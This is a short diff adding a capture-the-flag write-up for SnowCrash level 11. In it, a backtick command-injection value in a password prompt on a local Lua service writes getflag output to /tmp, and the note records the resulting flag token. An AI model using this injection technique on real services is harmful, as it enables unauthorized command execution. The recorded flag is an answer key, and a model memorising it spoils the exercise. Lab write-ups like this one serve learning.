@@ -1,0 +1,12 @@
+#+TITLE: SnowCrash -- Level11
+
+* lua + shell command injection
+ level11@SnowCrash:~$ nc localhost 5151
+ Password: `getflag > /tmp/test`
+ Erf nope..
+ level11@SnowCrash:~$ cat /tmp/test
+ Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+ level11@SnowCrash:~$
+
+* FLAG:
+** fa6v5ateaw21peobuub8ipe6s
